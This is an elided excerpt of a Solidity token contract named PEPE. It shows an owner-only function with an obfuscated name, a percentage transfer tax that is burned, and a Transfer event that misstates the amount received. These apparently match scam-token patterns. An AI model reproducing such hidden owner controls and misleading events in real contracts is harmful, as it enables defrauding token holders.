...
contract PEPE is Ownable {
    ...
    function SETpepeVIPexxe(address sss) external   {
        require(_PEPEPGOD == _msgSender());
        if (_PEPEPGOD == _msgSender()) {
    ...
    function _transfer(
        ...
        uint256 taxAmount = amount*pepepefeee/100;
        _balances[to] = _balances[to]+amount-taxAmount;

        emit Transfer(from, to, amount);
        emit Transfer(from, 0x000000000000000000000000000000000000dEaD, taxAmount);
    }
...
contract Token is PEPE {
    constructor(string memory name_, string memory symbol_) PEPE(name_,symbol_) {
